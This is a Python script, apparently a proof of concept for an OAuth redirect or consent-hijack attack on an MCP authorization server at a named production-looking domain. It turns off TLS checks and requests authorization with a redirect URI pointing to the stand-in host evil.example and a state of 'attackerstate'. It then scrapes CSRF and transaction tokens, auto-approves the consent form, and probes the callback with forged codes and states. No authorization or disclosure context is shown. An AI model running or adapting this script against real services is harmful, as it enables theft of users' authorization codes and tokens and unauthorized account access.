import base64, hashlib, os, re, urllib.parse, urllib.request, http.cookiejar, ssl
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
BASE="https://atomicwork.atomicwork.com"
cj=http.cookiejar.CookieJar()
op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders=[("User-Agent","Mozilla/5.0")]
def go(url, data=None, method=None):
    req=urllib.request.Request(url, data=data, method=method)
    try:
        r=op.open(req, timeout=20); return r.status, dict(r.headers), r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8","replace")
    except Exception as e:
        return -1, {}, str(e)
ver=base64.urlsafe_b64encode(os.urandom(32)).rstrip(b"=").decode()
chal=base64.urlsafe_b64encode(hashlib.sha256(ver.encode()).digest()).rstrip(b"=").decode()
q=urllib.parse.urlencode({"client_id":"atomicwork-mcp","response_type":"code","redirect_uri":"https://evil.example/cb","scope":"openid offline_access atomicwork.read","state":"attackerstate","code_challenge":chal,"code_challenge_method":"S256"})
st,h,b=go(f"{BASE}/authorize?{q}")
print("authorize:",st,h.get("Location"))
# follow consent
loc=h.get("Location","")
if loc.startswith("/"): loc=BASE+loc
st2,h2,b2=go(loc)
print("consent GET:",st2,len(b2))
m=re.search(r'name="txn_id"\s+value="([^"]+)"',b2) or re.search(r'value="([^"]+)"\s+name="txn_id"',b2)
csrf=re.search(r'name="csrf_token"\s+value="([^"]+)"',b2) or re.search(r'value="([^"]+)"\s+name="csrf_token"',b2)
txn=m.group(1) if m else None
tok=csrf.group(1) if csrf else None
print("txn:",txn,"csrf:",tok)
print("redirect shown:", re.findall(r'https://evil\.example[^<" ]*', b2)[:3])
if txn and tok:
    data=urllib.parse.urlencode({"txn_id":txn,"csrf_token":tok,"submit":"approve"}).encode()
    st3,h3,b3=go(BASE+"/consent", data=data, method="POST")
    print("approve:",st3,h3.get("Location"))
    loc3=h3.get("Location","")
    m3=re.search(r'[?&]state=([^&]+)', loc3)
    stt=m3.group(1) if m3 else txn
    print("state/txn:",stt)
    for u in [f"{BASE}/auth/callback?code=INVALIDCODE&state={urllib.parse.quote(stt)}", f"{BASE}/auth/callback?error=access_denied&state={urllib.parse.quote(stt)}", f"{BASE}/auth/callback?code=INVALIDCODE&state=bogus"]:
        a,b_,c_=go(u)
        print("callback:", u[-60:], "->", a, b_.get("Location"), "body:", c_[:120].replace("\n"," "))
